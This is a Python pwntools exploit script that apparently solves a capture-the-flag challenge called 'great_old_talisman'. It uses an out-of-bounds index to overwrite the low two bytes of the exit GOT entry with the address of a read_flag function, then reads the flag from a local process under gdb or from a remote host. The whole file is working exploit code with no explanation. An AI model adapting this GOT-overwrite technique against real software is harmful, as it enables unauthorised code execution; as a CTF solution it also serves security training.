#!/usr/bin/env python3


from pwn import *
import sys



def exploit(io, elf):
    exit_got = elf.got["exit"]
    read_flag = elf.symbols["read_flag"]
    talis = elf.symbols["talis"]

    offset = (exit_got - talis) // 8
    io.sendlineafter(b">> ", str(offset).encode())
    io.sendafter(b"Spell: ", p64(read_flag)[:2])
    
    flag = io.recv().decode()
    print(flag)



def main():
    if sys.argv[1] == "debug":
        io = gdb.debug("./great_old_talisman")
    else:
        HOST, PORT = sys.argv[1].split(":")
        io = remote(HOST, PORT) 
    
    elf = ELF("./great_old_talisman")
    exploit(io, elf)


if __name__ == "__main__":
    main()
